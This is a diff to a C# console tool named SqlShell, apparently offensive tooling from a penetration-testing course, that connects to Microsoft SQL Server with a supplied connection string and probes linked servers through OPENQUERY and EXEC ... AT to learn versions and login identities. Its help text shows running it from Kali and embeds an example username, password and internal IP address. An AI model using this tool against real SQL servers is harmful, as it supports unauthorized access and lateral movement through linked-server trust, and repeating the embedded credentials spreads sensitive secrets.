@@ -3,27 +3,62 @@ using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.Linq;
 using System.Text;
+using System.Xml.Linq;
 
 namespace SqlShell
 {
     internal class Program
     {
+
+        private static void PrintHelp()
+        {
+            Console.WriteLine("Just pass in the connection string eg.");
+            Console.WriteLine(".\\sqlshell.exe \"Server=server01.somestudio.com;Data Source=server01\\sqlexpress;Database=user_db;Integrated Security=SSPI;\"");
+            Console.WriteLine("Connection is like the following in the PDF");
+            Console.WriteLine(".\\sqlshell.exe \"Server = server01.somestudio.com; Database = someDatabase; Integrated Security = True;\"");
+            Console.WriteLine("Can also just do the server might sometimes work");
+            Console.WriteLine(".\\sqlshell.exe \"Server=server01.somestudio.com;\"");
+            Console.WriteLine("Good thing about just passing the connection you can also auth uid/pw instead of integrated eg.");
+            Console.WriteLine(".\\sqlshell.exe \"SERVER=192.168.154.140;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music\"");
+            Console.WriteLine("Also this works with mono so you can run it from kali eg.");
+            Console.WriteLine("mono sqlshell.exe \"SERVER=192.168.154.140;UID=webapp11;PWD=89543dfGDFGH4d;DATABASE=music\"");
+
+        }
+
         static void Main(string[] args)
         {
-            if ((int)args.Length == 1)
+            if ((int)args.Length == 1 && args[0] == "-h")
             {
-                string target_server = args[0];
-                string str1 = "master";
-                SqlConnection sqlConnection = new SqlConnection(string.Concat(new string[] { "Server = ", target_server, "; Database = ", str1, "; Integrated Security = True;" }));
-                Console.WriteLine("Connecting to " + target_server);
+                PrintHelp();
+            }
+            else if ((int)args.Length == 1)
+            {
+                string connectionString = args[0];
+                SqlConnection sqlConnection = null;
                 try
                 {
+                    Console.WriteLine(connectionString);                  
+                    sqlConnection = new SqlConnection(connectionString);
+                    if(sqlConnection is null)
+                    {
+                        Console.WriteLine("sqlConnection is null");
+                    }
+                    else
+                    {
+                        Console.WriteLine("sqlConnection is not null");
+                    }
+                    Console.WriteLine("Connecting using " + connectionString);
+               
                     sqlConnection.Open();
                     Console.WriteLine("Auth success!");
                 }
-                catch
+                catch(Exception e)
                 {
-                    Console.WriteLine("Auth failed");
+                    Console.WriteLine("Auth failed - not neccesarily the creds were wrong, maybe the server was.");
+                    Console.WriteLine(e.InnerException.ToString()); 
+                    Console.WriteLine(e.Message);
+                    Console.WriteLine(e.ToString());
+                    Console.WriteLine(e.StackTrace);
                     Environment.Exit(0);
                 }
 
@@ -158,14 +193,18 @@ namespace SqlShell
                     }
                     else if (command.ToLower().StartsWith("testopenquery "))
                     {
-                        command = "select version from openquery(\"" + command.Substring(14) + "\",'select @@version as version')";
+                        string host = command.Substring(14);
+                        command = "select version from openquery(\"" + host + "\",'select @@version as version')";
                         RunQuery(command, sqlConnection);
-                        command = "select mylogin from openquery(\""+command.Substring(14)+"\", 'select SYSTEM_USER as mylogin')";
+                        command = "select systemuser,currentuser,sessionuser from openquery(\"" + host + "\", 'select system_user as systemuser, current_user as currentuser, session_user as sessionuser')";
                         RunQuery(command, sqlConnection);
                     }
                     else if (command.ToLower().StartsWith("testat "))
                     {
-                        command = "EXEC ('select @@version') AT [" + command.Substring(7)+"];";
+                        string host = command.Substring(7);
+                        command = "EXEC ('select @@version') AT [" + host +"];";
+                        RunQuery(command, sqlConnection);
+                        command = "EXEC ('select system_user as systemuser, current_user as currentuser, session_user as sessionuser') AT [" + host + "];";
                         RunQuery(command, sqlConnection);
                     }
                     else if (command.ToLower().StartsWith("enableat "))
@@ -215,13 +254,15 @@ namespace SqlShell
             }
             else
             {
-                Console.WriteLine("Need one arg of the fqdn of target eg dc01.corp.com");
+                PrintHelp();
             }
         }
         public static void RunQuery(string command, SqlConnection sqlConnection)
         {
             try
             {
+                Console.WriteLine("Executing the following query:");
+                Console.WriteLine(command);
                 SqlDataReader sqlDataReader = (new SqlCommand(command, sqlConnection)).ExecuteReader();
                 Console.WriteLine("Printing Results:");
                 while (sqlDataReader.Read())
